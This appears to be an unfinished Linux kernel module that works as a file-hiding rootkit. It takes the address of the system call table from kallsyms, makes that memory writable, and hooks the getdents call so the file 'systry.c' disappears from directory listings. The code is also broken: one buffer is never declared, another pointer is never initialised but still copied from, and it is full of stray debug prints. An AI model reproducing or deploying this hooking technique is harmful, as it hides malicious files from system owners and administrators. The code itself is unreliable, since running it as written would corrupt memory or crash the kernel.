#define MODULE
#define LINUX
#define __KERNEL__

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <linux/dirent.h>
#include <linux/kallsyms.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

// #include <linux/init.h>
// #include <linux/moduleparam.h>
// #include <linux/semaphore.h>
// #include <asm/cacheflush.h>


struct linux_dirent {
           long           d_ino;
           off_t          d_off;
           unsigned short d_reclen;
           char           d_name[];
       };

static unsigned long **p_sys_call_table;
asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent* dirp, unsigned int count);


asmlinkage int sys_getdents_hook(unsigned int fd, struct linux_dirent* dirp, unsigned int count)
{
        int nread;
        struct linux_dirent *d;
        int bpos = 0;
        int rem;
        char dir_name[256] = {0};
        struct linux_dirent copied;
        char* myplace;


        printk("called by us");
        printk("again");
        nread = original_getdents(fd, dirp, count);
        printk("nread is %d", nread);
        printk("count is %d", count);
        printk("flush");
        // d = (struct linux_dirent *) (dirp + bpos);

        for (bpos = 0; bpos < nread;) {
            d = (struct linux_dirent *) ((char*)dirp + bpos);
            strncpy_from_user(dir_name, d->d_name, 256);
            printk("d name: %s", dir_name);

            copy_from_user(&copied, d, 24);
            printk("d_reclen is: %d", copied.d_reclen);

            if (strcmp(dir_name, "systry.c") == 0){
                printk("true");
                rem = count - (bpos + copied.d_reclen);
                // memmove(dirp + bpos ,dirp + bpos + copied.d_reclen, rem);
                tempbuf = kmalloc(sizeof(char) * count, GFP_KERNEL);
                copy_from_user(tempbuf, dirp, count);

                memmove(tempbuf + bpos ,myplace + bpos + copied.d_reclen, rem);

                copy_to_user(dirp, myplace, count);

                kfree(tempbuf);
                nread -= copied.d_reclen;
                return nread;   
            }
            bpos += copied.d_reclen;
        }

        return nread;
}


int set_page_rw(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
    return 0;
}

int init_module(void)
{
    void* sys_write;
    void* sys_read;

    printk("Hello World\n");
/* Aquire system calls table address */
    p_sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");
    printk("sys: %p", p_sys_call_table);
    printk("read by table: %p", p_sys_call_table[0]);
    sys_read = (void *) kallsyms_lookup_name("sys_read");
    printk("read: %p", sys_read);
    printk("before set write");
    set_page_rw((unsigned long)p_sys_call_table);
    printk("after set write");
    sys_write = (void *) kallsyms_lookup_name("sys_write");
    original_getdents = (void*)p_sys_call_table[78];
    p_sys_call_table[78] = (void*)sys_getdents_hook;
    printk("read by table: %p", p_sys_call_table[0]);
    printk("another mesg");
    return 0;
}

void cleanup_module(void)
{       
    p_sys_call_table[78] = (void*)original_getdents;
    printk("Module Removed\n");
}  

MODULE_LICENSE("GPL");